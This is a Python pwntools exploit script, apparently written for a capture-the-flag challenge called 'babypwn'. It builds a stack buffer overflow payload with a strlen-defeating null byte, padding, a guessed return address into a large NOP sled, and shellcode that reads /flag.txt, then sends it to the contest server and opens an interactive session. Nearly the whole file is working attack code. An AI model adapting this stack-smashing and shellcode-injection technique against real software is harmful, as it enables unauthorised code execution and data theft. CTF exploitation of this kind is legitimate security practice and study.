import pwn

pwn.context.arch = 'amd64'

sh = pwn.remote('chal.cybersecurityrumble.de', 1990)
# sh = pwn.remote('127.0.0.1', 1990)
# sh = pwn.process('./babypwn')


def inject_shellcode():
    # Target: 120 bytes
    # 8 bytes: (fake input)
    # 1 byte: (null to fool strlen)
    # 111 bytes: (no ops)
    # ---
    # 8 bytes: jump to shell code address
    # ---
    # 100 bytes: (no ops)
    # ? bytes: (shellcode)

    ret_addr_padding = 120

    payload = b'12345678' + b'\0';

    padding = ret_addr_padding - len(payload)
    payload += pwn.cyclic(padding)

    # [stack]         0x7fffffffcf09 0x6161616261616161 ('aaaabaaa')
    # real buffer addr = 0x7fffffffcf00?

    # buffer_addr = 0x7fffffffcde0
    # buffer_addr = 0x7fffffffcf00
    # buffer_addr = 0x7fffffffce10
    # buffer_addr = 0x7fffffffceb0
    # sh_code_addr = buffer_addr + len(payload) + 8 # Throw it into the no-ops

    # sh_code_addr = 0x7fffffffdf8a
    # sh_code_addr = 0x7fffffffce98
    sh_code_addr = 0x7fffffffef90 # guess
    # 0x7fffffffce6a

    print('sh_code_addr: ', hex(sh_code_addr))
    payload += pwn.p64(sh_code_addr)

    payload += pwn.asm(pwn.shellcraft.nop()) * 2048

    # Since we are using `gets`, `stdin` mustbe re-opened if we want to use it
    # Instead let's just `cat` the file
    sh_code = pwn.shellcraft.amd64.linux.cat('/flag.txt')
    # sh_code = pwn.shellcraft.amd64.linux.echo('hello\n', pwn.constants.STDOUT_FILENO)
    sh_code += pwn.shellcraft.exit(0)
    # sh_code += pwn.shellcraft.crash()
    # 0x7fffffffcf9d

    # sh_code = pwn.shellcraft.infloop()

    # p = pwn.run_assembly(sh_code)
    # print(p.recvall())

    sh_code = pwn.asm(sh_code)
    sh_code = pwn.encoder.line(sh_code)

    payload += sh_code
    print('Payload len: ', len(payload))

    return payload


payload = inject_shellcode()

with open('payload', 'wb') as f:
    f.write(payload)

sh.send(payload)
# print(sh.recvall())
sh.interactive()
